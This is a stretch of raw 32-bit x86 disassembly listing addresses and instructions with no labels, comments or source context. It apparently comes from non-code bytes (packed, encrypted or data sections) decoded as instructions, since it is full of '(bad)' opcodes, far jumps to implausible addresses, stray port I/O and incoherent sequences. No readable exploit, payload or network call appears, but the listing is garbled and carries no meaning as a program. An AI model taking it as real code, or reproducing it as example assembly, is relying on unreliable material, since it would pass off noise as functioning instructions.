  41179e:	dec    eax
  41179f:	push   cs
  4117a0:	lds    eax,FWORD PTR [eax+0x50a8fffc]
  4117a6:	or     al,BYTE PTR [ebx-0x5a]
  4117a9:	pop    ds
  4117aa:	mov    ebp,edi
  4117ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  4117c1:	add    cl,bl
  4117c3:	dec    ecx
  4117c4:	(bad)  
  4117c5:	jmp    0xa9c58f6e
  4117ca:	jmp    0x8:0x7339fe48
  4117d1:	mul    BYTE PTR [edx+ebx*2+0x2a4e75e]
  4117d8:	or     ebp,DWORD PTR [ecx+0x2c82ee5f]
  4117de:	in     al,0x47
  4117e0:	(bad)  
  4117e1:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117e3:	into   
  4117e4:	or     ebx,DWORD PTR [esi+0x3f]
  4117e7:	mov    ebp,edi
  4117e9:	push   esi
  4117ea:	imul   edi,DWORD PTR [eax+0x4],0xffc3b3d9
  4117f1:	push   ecx
  4117f2:	mov    ch,0x5d
  4117f4:	sbb    DWORD PTR [esi],edi
  4117f6:	fisttp WORD PTR [edi+eiz*8+0x7d]
  4117fa:	mov    al,ds:0xcf2e0002
  4117ff:	push   eax
  411800:	out    0x55,eax
  411802:	mov    al,ds:0xdc120002
  411807:	inc    edi
  411808:	je     0x41181b
  41180a:	jl     0x4117af
  41180c:	add    ebp,ecx
  41180e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41180f:	ja     0x411795
  411811:	xor    eax,0x99fe485a
  411816:	jno    0x4117a6
  411818:	(bad)  
  411819:	imul   DWORD PTR [edx+0x48]
  41181c:	out    0x45,eax
  41181e:	lahf   
  41181f:	add    al,BYTE PTR [eax]
  411821:	shl    BYTE PTR [eax+0xdefe49],1
	...
  41183b:	repnz mov es,edi
  41183e:	xlat   BYTE PTR ds:[ebx]
  41183f:	jmp    0x2:0x9f69e748
  411846:	add    BYTE PTR ds:0x4dc959c2,dl
  41184c:	nop
  41184d:	mov    esp,ebp
  41184f:	or     eax,0xe653debb
  411854:	clc    
  411855:	in     al,0x40
  411857:	jle    0x411815
  411859:	jo     0x41185c
  41185b:	or     eax,0x43d81b6
  411860:	jmp    0x307f18a5
  411865:	pop    es
  411866:	and    DWORD PTR [ebx-0x42],0x2c
  41186a:	inc    ecx
  41186b:	dec    esi
  41186c:	add    al,0x75
  41186e:	add    eax,0xc959c465
  411873:	std    
  411874:	mov    ebp,0x43efc43
  411879:	add    BYTE PTR [eax],al
  41187b:	leave  
  41187c:	aas    
  41187d:	test   BYTE PTR [eax],0xe
  411880:	add    al,0x0
  411882:	(bad)  
  411883:	dec    ebx
  411884:	test   al,0xfe
  411886:	(bad)  
  411887:	inc    BYTE PTR [ebx]
  411889:	mov    DWORD PTR [ebp-0x46],0xefffffe
  411890:	mov    edi,0x3fef043
  411895:	add    BYTE PTR [eax],al
  411897:	jae    0x4118d8
  411899:	out    dx,al
  41189a:	push   eax
  41189b:	push   ebx
  41189c:	aas    
  41189d:	repnz push eax
	...
  4118b3:	add    BYTE PTR [ebx+0x3f],al
  4118b6:	jmp    0xa245:0x8bb72450
  4118bd:	mov    gs,WORD PTR [eax+0x2]
  4118c0:	adc    al,0x3
  4118c2:	push   0x0
  4118c4:	mov    cl,0x50
  4118c6:	enter  0xff2e,0x3
  4118ca:	mov    DWORD PTR [ebp-0x2a],eax
  4118cd:	cmp    BYTE PTR [ebx-0x18],0x8e
  4118d1:	das    
  4118d2:	pop    es
  4118d3:	and    DWORD PTR [edi-0x5816a452],0x13750259
  4118dd:	inc    ecx
  4118de:	aad    0xfb
  4118e0:	xor    BYTE PTR [esi],bl
  4118e2:	dec    esp
  4118e3:	cmp    dl,0x91
  4118e6:	add    dh,BYTE PTR [ebp+ecx*8-0x1c]
  4118ea:	lods   eax,DWORD PTR ds:[esi]
  4118eb:	idiv   DWORD PTR [eax+eiz*2+0x4b]
  4118ef:	jb     0x4118c0
  4118f1:	jno    0x4118c8
  4118f3:	inc    ecx
  4118f4:	pop    eax
  4118f5:	jo     0x411970
  4118f7:	inc    esp
  4118f8:	inc    edi
  4118f9:	js     0x41190a
  4118fb:	call   0xfe8e34bc
  411900:	lods   al,BYTE PTR ds:[esi]
  411901:	cdq    
  411902:	(bad)  
  411903:	and    ch,BYTE PTR [esi]
  411905:	push   ss
  411906:	push   0x5c81a369
  41190b:	xor    DWORD PTR [eax],ebp
  41190d:	loopne 0x41195a
  41190f:	je     0x411918
  411911:	fadd   st,st(2)
  411913:	pop    es
  411914:	sbb    BYTE PTR [esi],ah
  411916:	data16 mov es,WORD PTR [eax]
	...
  41192d:	addr16 pop ebp
  41192f:	dec    ebx
  411930:	xor    al,0x65
  411932:	xchg   esp,eax
  411933:	sar    edi,0x31
  411936:	pop    ecx
  411937:	lahf   
  411938:	inc    ecx
  411939:	ins    BYTE PTR es:[edi],dx
  41193a:	call   0x4c4b:0x8ce48302
  411941:	sti    
  411942:	fcmovne st,st(5)
  411944:	jmp    0x4118ed
  411946:	outs   dx,BYTE PTR ds:[esi]
  411947:	xchg   esi,edi
  411949:	push   edx
  41194a:	in     eax,dx
  41194b:	dec    ebx
  41194c:	adc    al,0xe9
  41194e:	xchg   cl,al
  411950:	jmp    ecx
  411952:	xchg   ebp,eax
  411953:	dec    esi
  411954:	inc    eax
  411956:	pop    eax
  411957:	add    al,BYTE PTR [ecx-0xa6fec6]
  41195d:	mov    al,0x58
  41195f:	aad    0x4
  411961:	mov    esi,0xa14b4501
  411966:	inc    esi
  411967:	imul   ecx,ecx,0xfd5d039c
  41196d:	xchg   ecx,eax
  41196e:	ror    ah,1
  411970:	dec    ebx
  411971:	mov    bl,0x3c
  411973:	push   ss
  411974:	lds    eax,FWORD PTR [eax-0x58fc1872]
  41197a:	add    dl,BYTE PTR [edx]
  41197c:	cmp    eax,0x5861b065
  411981:	and    eax,0xf9b7bc3f
  411986:	fisub  DWORD PTR [ebx]
  411988:	bound  ebx,QWORD PTR [eax-0x58296efe]
  41198e:	inc    ecx
  41198f:	lea    eax,[edi+0x0]
	...
  4119a5:	add    BYTE PTR [ebx+0x40c4d644],cl
  4119ab:	inc    esi
  4119ac:	hlt    
  4119ad:	cld    
  4119ae:	and    eax,0xe61ae308
  4119b3:	add    ch,cl
  4119b5:	shl    BYTE PTR [edx+0x7dab2919],1
  4119bb:	cmp    ebp,DWORD PTR [ecx]
  4119bd:	jg     0x41197a
  4119bf:	shl    BYTE PTR [ecx+0x775b10c4],0x5
  4119c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119c7:	add    dl,BYTE PTR [ecx+0x20]
  4119ca:	add    eax,DWORD PTR [esi+0x3d]
  4119cd:	xchg   DWORD PTR [ebx-0xf3b5e44],edi
  4119d3:	inc    ebp
  4119d4:	mov    ah,0xf2
  4119d6:	jmp    0x9b8c06ac
  4119db:	mov    esp,0x5dd8c4b1
  4119e0:	inc    esi
  4119e1:	pop    es
  4119e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119e3:	add    ah,dl
  4119e5:	inc    ebx
  4119e6:	push   ebx
  4119e7:	dec    DWORD PTR [edi]
  4119e9:	fisub  WORD PTR [edi+0x6342e902]
  4119ef:	inc    esi
  4119f0:	(bad)  
  4119f1:	call   0x5c411c9a
  4119f6:	out    0x49,al
  4119f8:	dec    edi
  4119f9:	push   ebx
  4119fa:	stos   DWORD PTR es:[edi],eax
  4119fb:	fadd   DWORD PTR [ecx]
  4119fd:	fidiv  WORD PTR [ecx+0x1]
  411a00:	push   0xffffffe9
  411a02:	fst    st(0)
  411a04:	add    ecx,esi
  411a06:	xchg   edi,eax
  411a07:	sti    
  411a08:	sub    BYTE PTR cs:[eax],al
	...
  411a1f:	stos   DWORD PTR es:[edi],eax
  411a20:	stc    
  411a21:	mov    edi,0x885ba635
  411a26:	jmp    0x3b401ccf
  411a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a2c:	pop    edx
  411a2d:	pop    ecx
  411a2e:	sub    ah,ch
  411a30:	inc    esp
  411a31:	mov    BYTE PTR [ebx+ebp*8],ah
  411a34:	inc    esp
  411a35:	jb     0x411a24
  411a37:	in     al,dx
  411a38:	push   edi
  411a39:	add    ecx,ebp
  411a3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a3c:	mov    dl,0xfe
  411a3e:	cld    
  411a3f:	in     al,dx
  411a40:	mov    ch,0xfe
  411a42:	cli    
  411a43:	cmp    ch,bl
  411a45:	jmp    edi
  411a47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a48:	add    ch,BYTE PTR [eax-0x17]
  411a4b:	sub    BYTE PTR [ebp-0x2],al
  411a4e:	push   ecx
  411a4f:	xchg   DWORD PTR [eax],eax
  411a51:	add    cl,ch
  411a53:	sbb    DWORD PTR [ebp-0x419bfd8d],eax
  411a59:	sti    
  411a5a:	jmp    0x74411d03
  411a5f:	out    0x48,eax
  411a61:	dec    edi
  411a62:	shl    DWORD PTR [eax+ebx*8+0x4cd73601],cl
  411a69:	imul   ebp,ecx,0x2603d05d
  411a6f:	xlat   BYTE PTR ds:[ebx]
  411a70:	cli    
  411a71:	cs test al,0xa4
  411a74:	stc    
  411a75:	mov    edi,0x7443d29d
  411a7a:	adc    DWORD PTR [edi+ebx*4+0x30],ebp
  411a7e:	add    BYTE PTR [ecx+0x30e9b8],ch
	...
  411a98:	mov    ecx,0x5ae8f634
  411a9d:	out    dx,al
  411a9e:	(bad)  
  411a9f:	(bad)  
  411aa0:	jns    0x411aa3
  411aa2:	and    BYTE PTR [ecx-0x72],al
  411aa5:	ret    
  411aa6:	inc    ebx
  411aa7:	cld    
  411aa8:	mov    es,WORD PTR [eax]
  411aaa:	add    BYTE PTR [eax],al
  411aac:	or     eax,DWORD PTR [edx+edi*8+0x69fee450]
  411ab3:	add    ah,BYTE PTR [ecx-0x420101dc]
  411ab9:	add    bh,bh
  411abb:	adc    eax,0x40eb84
  411ac0:	test   eax,eax
  411ac2:	or     eax,0xfffef784
  411ac7:	inc    DWORD PTR [ecx]
  411ac9:	test   dh,dl
  411acb:	and    BYTE PTR [esi],bh
  411acd:	add    BYTE PTR [eax],al
  411acf:	mov    DWORD PTR [ebx+0x4e00001a],0x4273ff00
  411ad9:	retf   
  411ada:	inc    ebx
  411adb:	loopne 0x411a96
  411add:	sub    eax,0xe2838f06
  411ae2:	lds    eax,FWORD PTR [ebp+0x76]
  411ae5:	(bad)  
  411ae6:	(bad)  
  411ae7:	dec    DWORD PTR [esi]
  411ae9:	ret    
  411aea:	inc    ebx
  411aeb:	in     al,dx
  411aec:	(bad)  
  411aed:	(bad)  
  411aee:	(bad)  
  411aef:	inc    ecx
  411af1:	sub    esi,0x0
  411af4:	push   cs
  411af5:	add    BYTE PTR [eax],al
  411af7:	mov    DWORD PTR [ebx-0x4c],0xfffe
	...
  411b0e:	add    BYTE PTR [eax],al
  411b10:	add    dh,bh
  411b12:	dec    DWORD PTR [ebp+eax*2+0x75fd8e96]
  411b19:	mov    ah,BYTE PTR [esi-0x31fbd4]
  411b1f:	or     al,al
  411b21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b22:	gs jmp 0xae74:0x3ed4a82
  411b2a:	cld    
  411b2b:	into   
  411b2c:	repz sub BYTE PTR [edi-0x2e],bl
  411b30:	sub    BYTE PTR [esi+0x59],ah
  411b33:	aas    
  411b34:	inc    esp
  411b35:	rcr    DWORD PTR [edx+0x2],cl
  411b38:	add    BYTE PTR [edi-0x1d3900d0],ah
  411b3e:	lea    eax,[edx]
  411b40:	add    BYTE PTR [edi-0x748bb8a7],ah
  411b46:	xor    al,0xed
  411b48:	std    
  411b49:	rcr    DWORD PTR [edx],1
  411b4b:	add    al,0xb
  411b4d:	addr16 or eax,0x830ce7ea
  411b53:	inc    edi
  411b54:	(bad)  
  411b55:	and    al,0x56
  411b57:	push   eax
  411b58:	sub    eax,0x740259e6
  411b5d:	mov    eax,ds:0x81f5ed64
  411b62:	sbb    al,BYTE PTR [edi+eax*8]
  411b65:	mov    ds:0xa7411ae9,al
  411b6a:	pop    edx
  411b6b:	add    al,BYTE PTR [eax]
  411b6d:	daa    
  411b6e:	fadd   st,st(5)
  411b70:	shl    DWORD PTR [edi+0xfefb45],cl
	...
  411b8a:	mov    dl,0xcd
  411b8c:	inc    edi
  411b8d:	je     0x411bb2
  411b8f:	mov    cl,0x2d
  411b91:	add    ah,BYTE PTR [edi+0x13744759]
  411b97:	rol    DWORD PTR [ebx+0x0],0xa7
  411b9b:	pop    ecx
  411b9c:	inc    esi
  411b9d:	xor    ah,bh
  411b9f:	add    DWORD PTR [edi-0x2],0xad5503f8
  411ba6:	scas   eax,DWORD PTR es:[edi]
  411ba7:	push   esp
  411ba8:	test   DWORD PTR [ebp+eax*8+0x2cfe4814],0xfdfd0202
  411bb3:	repnz arpl ax,sp
  411bb6:	rol    BYTE PTR [edx+0x15],cl
  411bb9:	mov    esp,DWORD PTR [edi+0x6003e902]
  411bbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bc0:	das    
  411bc1:	inc    esp
  411bc2:	push   ebx
  411bc3:	ja     0x411bd1
  411bc5:	test   ah,ah
  411bc7:	inc    ebp
  411bc8:	sub    ch,0xc0
  411bcb:	shr    eax,0x4b
  411bce:	push   ss
  411bcf:	add    al,0xaa
  411bd1:	inc    edi
  411bd2:	push   cs
  411bd3:	add    edx,ecx
  411bd5:	xor    eax,0x5be902a6
  411bda:	mov    bh,ch
  411bdc:	int    0x47
  411bde:	mov    BYTE PTR [eax-0x5486b847],bl
  411be4:	scas   al,BYTE PTR es:[edi]
  411be5:	push   ss
  411be6:	out    0x2,al
  411be8:	inc    ecx
  411be9:	(bad)  
  411bea:	mov    ebx,0x5be8c3
	...
  411c03:	mov    bl,0xfd
  411c05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c06:	inc    edi
  411c07:	rcr    BYTE PTR [eax],0xce
  411c0a:	les    edx,FWORD PTR [eax-0x56]
  411c0d:	cmp    eax,0x8102e616
  411c12:	inc    esi
  411c13:	jle    0x411c56
  411c15:	test   esp,ebx
  411c17:	push   esi
  411c18:	icebp  
  411c19:	daa    
  411c1a:	add    al,0xbf
  411c1c:	loop   0x411be1
  411c1e:	les    ebp,FWORD PTR [eax]
  411c20:	sub    bh,BYTE PTR [ebp+0xa]
  411c23:	and    BYTE PTR [edx-0x30],al
  411c26:	jno    0x411bf7
  411c28:	ret    
  411c29:	call   0xa82cb109
  411c2e:	add    edi,edi
  411c30:	and    dl,BYTE PTR [edx]
  411c32:	inc    edi
  411c33:	add    DWORD PTR [ebx+0x266162e],ebp
  411c39:	shr    DWORD PTR [edx],1
  411c3b:	mov    esp,0x4ce8ffc3
  411c40:	push   edx
  411c41:	cmp    DWORD PTR [esi],ebp
  411c43:	push   0xe3d02aa9
  411c48:	inc    ecx
  411c49:	data16 adc dh,BYTE PTR [ebx+0x6500ffc3]
  411c50:	sti    
  411c51:	dec    BYTE PTR [esi]
  411c53:	arpl   WORD PTR [eax],cx
  411c55:	cli    
  411c56:	push   es
  411c57:	pusha  
  411c58:	sub    DWORD PTR [ebx+eax*1],esi
  411c5b:	push   0xd7290a40
  411c60:	adc    al,0xe8
  411c62:	fucomip st,st(5)
  411c64:	inc    eax
  411c65:	(bad)  
  411c66:	repnz add BYTE PTR [eax],al
	...
  411c79:	add    BYTE PTR [eax],al
  411c7b:	add    ah,ah
  411c7d:	mov    ch,0x9
  411c7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c81:	push   es
  411c82:	dec    esp
  411c83:	sub    BYTE PTR [ebx-0x5b16fffd],ah
  411c89:	stos   BYTE PTR es:[edi],al
  411c8a:	add    al,ch
  411c8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c8d:	add    ch,al
  411c8f:	(bad)  
  411c90:	xchg   esp,eax
  411c91:	inc    ecx
  411c92:	dec    BYTE PTR [edx-0x16bf33d6]
  411c98:	mov    eax,ds:0xa3e8fbc6
  411c9d:	add    al,BYTE PTR [eax]
  411c9f:	ins    BYTE PTR es:[edi],dx
  411ca0:	addr16 cmp eax,0xc8b7964f
  411ca6:	dec    edx
  411ca7:	sub    BYTE PTR [ebx-0x5b1497d6],ch
  411cad:	add    cl,BYTE PTR [ebx]
  411caf:	test   eax,0xbcff1657
  411cb4:	jmp    0x2e57:0x7ce940cb
  411cbb:	popaw  
  411cbd:	dec    eax
  411cbe:	add    al,0xa7
  411cc0:	dec    ebp
  411cc1:	ret    0xe8ff
  411cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cc5:	add    al,BYTE PTR [eax]
  411cc7:	inc    ecx
  411cc8:	or     dh,bh
  411cca:	inc    BYTE PTR [eax]
  411ccc:	popa   
  411ccd:	fld    QWORD PTR [ebx+esi*1]
  411cd0:	mov    cl,0xc8
  411cd2:	push   si
  411cd4:	cdq    
  411cd5:	inc    edi
  411cd6:	(bad)  
  411cd7:	out    0xcd,eax
  411cd9:	sar    ebp,cl
  411cdb:	call   DWORD PTR [edi+0x8b53c4]
	...
  411cf5:	mov    ds:0xfee9055d,al
  411cfa:	add    al,0xf8
  411cfc:	jb     0x411ccd
  411cfe:	ret    
  411cff:	std    
  411d00:	push   0xffffffce
  411d02:	fdivr  QWORD PTR [eax-0x47fb41ff]
  411d08:	add    BYTE PTR [esi-0x3336fffc],bh
  411d0e:	aas    
  411d0f:	(bad)  
  411d10:	scas   eax,DWORD PTR es:[di]
  411d12:	fstp   TBYTE PTR [esi]
  411d14:	add    BYTE PTR [esi+0x71c2ff55],al
  411d1a:	pop    edi
  411d1b:	clc    
  411d1c:	call   0xa42923ef
  411d21:	pop    DWORD PTR [eax+eax*1]
  411d24:	call   0x3ee66d
  411d29:	mov    dx,0xfff0
  411d2d:	adc    edi,ebx
  411d2f:	adc    dh,ch
  411d31:	add    esi,eax
  411d33:	out    0xfc,al
  411d35:	cmp    eax,esi
  411d37:	std    
  411d38:	xor    DWORD PTR [ebx+0x40],0x4a
  411d3c:	inc    ecx
  411d3d:	dec    esi
  411d3e:	add    al,0x74
  411d40:	sbb    ebp,ecx
  411d42:	pop    es
  411d43:	imul   BYTE PTR [esi]
  411d45:	jg     0x411d4d
  411d47:	add    BYTE PTR [eax+edi*1-0x39],dh
  411d4b:	adc    esi,esi
  411d4d:	pusha  
  411d4e:	inc    ebp
  411d4f:	inc    dh
  411d51:	or     edx,DWORD PTR [edi+eiz*1+0x41]
  411d55:	inc    BYTE PTR [eax+eax*1]
	...
  411d6c:	add    BYTE PTR [eax],al
  411d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d6f:	test   eax,0xd0fcc65b
  411d74:	inc    esp
  411d75:	out    0xef,eax
  411d77:	lds    eax,FWORD PTR [esi+edi*8-0x1c]
  411d7b:	push   ecx
  411d7c:	int3   
  411d7d:	call   0x718b46e9
  411d82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d83:	in     al,dx
  411d84:	inc    esp
  411d85:	out    0xb0,eax
  411d87:	sub    al,BYTE PTR [edx]
  411d89:	add    BYTE PTR ds:0xf52aa926,bh
  411d8f:	and    BYTE PTR [ebx-0x7e],dl
  411d92:	mov    ebp,0xcc01cd25
  411d97:	sub    edx,DWORD PTR [edi-0x16]
  411d9a:	mov    edi,0xa8fe44a8
  411d9f:	add    DWORD PTR [esi+esi*8-0x60],ebp
  411da3:	xor    al,bl
  411da5:	inc    DWORD PTR [eax-0x58fffceb]
  411dab:	pusha  
  411dac:	sbb    eax,0x3eaee90
  411db1:	dec    edx
  411db3:	mov    ch,0xa9
  411db5:	inc    eax
  411db6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411db7:	dec    eax
  411db8:	sbb    eax,0x3eace98
  411dbd:	inc    edx
  411dbf:	aad    0xa9
  411dc1:	inc    eax
  411dc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dc3:	jo     0x411de2
  411dc5:	mov    al,ds:0xff03eafe
  411dca:	mov    al,ch
  411dcc:	test   eax,0x1d98a740
  411dd1:	test   al,0x0
	...
  411de7:	fsubp  st(2),st
  411de9:	add    edi,edi
  411deb:	adc    ch,0xa9
  411dee:	inc    eax
  411def:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411df0:	rcr    BYTE PTR ds:0x3eaceb0,0xff
  411df7:	retf   0xa9f5
  411dfa:	inc    eax
  411dfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dfc:	add    ah,BYTE PTR [esi+0x1e]
  411dff:	dec    edi
  411e00:	fldenv [edi-0x6b1af7fd]
  411e06:	stos   BYTE PTR es:[edi],al
  411e07:	add    cl,BYTE PTR [bp+0x1e]
  411e0b:	out    0xd8,eax
  411e0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e0e:	add    esi,eax
  411e10:	in     al,0x24
  411e12:	stos   BYTE PTR es:[edi],al
  411e13:	add    dh,BYTE PTR ds:0xef1e
  411e18:	fsub   DWORD PTR [edi+0x34e4d803]
  411e1e:	stos   BYTE PTR es:[edi],al
  411e1f:	add    bl,BYTE PTR ds:0xf71e
  411e24:	fsub   DWORD PTR [edi+0x34e4c003]
  411e2a:	stos   BYTE PTR es:[edi],al
  411e2b:	add    al,BYTE PTR ds:0xcf1e
  411e30:	fsub   DWORD PTR [edi+0x14e4a803]
  411e36:	stos   BYTE PTR es:[edi],al
  411e37:	out    0x2,eax
  411e39:	out    dx,al
  411e3a:	sbb    eax,0x427dc87
  411e3f:	nop
  411e40:	call   0x328fc09
  411e45:	(bad)  
  411e46:	jmp    0x468fad3
	...
  411e5f:	add    BYTE PTR [eax-0x18],bh
  411e62:	aam    0xdd
  411e64:	out    0x2,eax
  411e66:	mov    esi,0x27dc78e9
  411e6b:	add    al,0x60
  411e6d:	call   0x328fc26
  411e72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e73:	jmp    0x468fad0
  411e78:	dec    eax
  411e79:	call   0x328fc12
  411e7e:	mov    gs,ecx
  411e80:	cmp    ah,bl
  411e82:	daa    
  411e83:	add    al,0x30
  411e85:	call   0x328fc6e
  411e8a:	add    BYTE PTR [esi+0xe],dh
  411e8d:	push   es
  411e8e:	pop    edx
  411e8f:	sub    BYTE PTR [ebx-0xd0adbc3],ah
  411e95:	ret    0x5dff
  411e98:	dec    BYTE PTR ds:0x3da4a85a
  411e9e:	and    al,0xf5
  411ea0:	fcmovb st,st(2)
  411ea2:	inc    DWORD PTR [ebp-0x2]
  411ea5:	adc    eax,0x3da4a85a
  411eaa:	and    al,0xd5
  411eac:	add    al,bl
  411eae:	jmp    FWORD PTR ds:0xa85a1dce
  411eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411eb5:	cmp    eax,0xc2eac524
  411eba:	call   DWORD PTR ds:0xa859e5ce
  411ec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ec1:	cmp    eax,0xd524
	...
  411ed6:	add    BYTE PTR [eax],al
  411ed8:	add    dl,dl
  411eda:	ret    0xfdff
  411edd:	mov    edi,0xa4a859ed
  411ee2:	cmp    eax,0xc27ab524
  411ee7:	jmp    ebp
  411ee9:	jg     0x411ee0
  411eeb:	pop    ecx
  411eec:	sub    BYTE PTR [ebx+0x6115243d],ah
  411ef2:	ret    0xcdff
  411ef5:	(bad)  
  411ef6:	std    
  411ef7:	pop    ecx
  411ef8:	sub    BYTE PTR [ebx+0x4925243d],ch
  411efe:	ret    0xb5ff
  411f01:	dec    edi
  411f02:	lds    ebx,FWORD PTR [ecx+0x28]
  411f05:	mov    ds:0x7135243d,eax
  411f0a:	ret    0x9dff
  411f0d:	aas    
  411f0e:	int    0x59
  411f10:	sub    BYTE PTR [ebx+0x5935243d],ch
  411f16:	ret    0xffff
  411f19:	sub    DWORD PTR [edx],ebp
  411f1b:	push   esi
  411f1c:	pop    edx
  411f1d:	jg     0x411f25
  411f1f:	jmp    DWORD PTR ds:0x3f5cba
  411f25:	mov    DWORD PTR [edx],ebp
  411f27:	bound  ebx,QWORD PTR [edx+0x3f]
  411f2a:	add    edi,edi
  411f2c:	and    eax,0x3f5ef6
  411f31:	pop    ecx
  411f32:	sub    ch,BYTE PTR [edx+0x5a]
  411f35:	dec    edi
  411f36:	add    edi,edi
  411f38:	and    eax,0x3f5f2e
	...
  411f51:	add    BYTE PTR [ecx+0xf5a722a],ch
  411f57:	add    edi,edi
  411f59:	and    eax,0x3f5f16
  411f5e:	mov    DWORD PTR [edx],ebp
  411f60:	jle    0x411fbc
  411f62:	inc    DWORD PTR [eax]
  411f64:	jmp    DWORD PTR ds:0x3f5f46
  411f6a:	test   eax,0xff5a8a2a
  411f6f:	add    bh,bh
  411f71:	and    eax,0x3f5f4e
  411f76:	cdq    
  411f77:	and    al,0x92
  411f79:	pop    edx
  411f7a:	dec    edi
  411f7b:	add    bh,bh
  411f7d:	and    eax,0x3f5d26
  411f82:	imul   esp,DWORD PTR [edx+ebx*4],0xff06cf5a
  411f89:	and    eax,0x3f5d2e
  411f8e:	imul   esp,DWORD PTR [edx+eiz*4],0xff06bf5a
  411f95:	and    eax,0x3f5d26
  411f9a:	or     DWORD PTR [edx+ebp*4],esp
  411f9d:	pop    edx
  411f9e:	jg     0x411fa6
  411fa0:	jmp    DWORD PTR ds:0x3f5cf2
  411fa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fa7:	xchg   esp,eax
  411fa8:	out    0xbb,al
  411faa:	fucomp st(2)
  411fac:	add    edi,edi
  411fae:	mov    ch,BYTE PTR [ecx-0x23]
  411fb1:	inc    eax
  411fb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fb3:	mov    esp,0xc7e6
	...
  411fc8:	add    BYTE PTR [eax],al
  411fca:	add    BYTE PTR [ebp-0x16],bh
  411fcd:	add    edi,edi
  411fcf:	ret    0xdd9d
  411fd2:	inc    eax
  411fd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fd5:	out    0xcf,al
  411fd7:	ins    DWORD PTR es:[edi],dx
  411fd8:	push   0x2
  411fda:	dec    edx
  411fdc:	std    
  411fdd:	fld    QWORD PTR [eax-0x59]
  411fe0:	int3   
  411fe1:	out    0xd7,al
  411fe3:	dec    ebp
  411fe4:	push   0x2
  411fe6:	inc    edx
  411fe8:	sbb    eax,0xf4a740de
  411fed:	out    0xe3,al
  411fef:	jge    0x41205b
  411ff1:	add    bh,bh
  411ff3:	mov    dl,BYTE PTR [ecx]
  411ff5:	fiadd  WORD PTR [eax-0x59]
  411ff8:	sbb    al,0xe7
  411ffa:	jmp    0x412059
  411ffc:	push   0x2
  411ffe:	inc    DWORD PTR [edx-0x58bf21e7]
  412004:	add    al,0xe7
  412006:	repz dec ebp
  412008:	push   0x2
  41200a:	dec    edx
  41200c:	xor    esp,ebx
  41200e:	inc    eax
  41200f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412010:	sub    al,0xe5
  412012:	sti    
  412013:	in     eax,dx
  412014:	jmp    0x40db:0x29c2ff03
  41201b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41201c:	push   esp
  41201d:	in     eax,0x3
  41201f:	fsub   st(2),st
  412021:	add    edi,edi
  412023:	retf   0xdb31
  412026:	inc    eax
  412027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412028:	jl     0x41200f
  41202a:	paddb  mm5,mm2
  41202d:	add    edi,edi
	...
  412043:	add    BYTE PTR [edx-0x58bf24ab],al
  412049:	add    dh,BYTE PTR [ebp-0x53b1a3b1]
  41204f:	dec    edi
  412050:	ins    BYTE PTR es:[edi],dx
  412051:	dec    esi
  412052:	popa   
  412053:	mov    DWORD PTR [esi+eax*1-0x4259c496],0x2c47bf0
  41205e:	jmp    0xe9470566
  412063:	test   BYTE PTR [eax],dl
  412065:	push   es
  412066:	in     al,dx
  412067:	or     ecx,DWORD PTR [edi+0x0]
  41206a:	jmp    0xe481c772
  41206f:	add    esp,DWORD PTR [edx+edi*1]
  412072:	loopne 0x412032
  412074:	mov    al,ds:0xa703e47a
  412079:	add    ch,BYTE PTR [ebx]
  41207b:	pop    es
  41207c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41207d:	jg     0x4120bf
  41207f:	adc    esp,DWORD PTR [edx+0xa]
  412082:	jno    0x41208d
  412084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412085:	add    ch,cl
  412087:	inc    ebp
  412088:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412089:	add    ch,BYTE PTR [edx+0x3b]
  41208c:	test   al,0xbd
  41208e:	lock jnp 0x412039
  412091:	add    ch,cl
  412093:	add    esp,ebp
  412095:	add    eax,0xc1b884e9
  41209a:	or     DWORD PTR [ebx],0xffffffef
  41209d:	pop    es
  41209e:	jmp    0xec85c7a6
  4120a3:	add    ebx,edx
  4120a5:	sub    al,0x3
	...
  4120bc:	add    BYTE PTR [edi-0x63840f49],ah
  4120c2:	add    ch,cl
  4120c4:	add    esp,DWORD PTR [ebp-0x1]
  4120c7:	call   0xe944c7cc
  4120cc:	add    esi,edx
  4120ce:	or     al,BYTE PTR [ecx-0x16fd58f2]
  4120d4:	inc    ecx
  4120d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
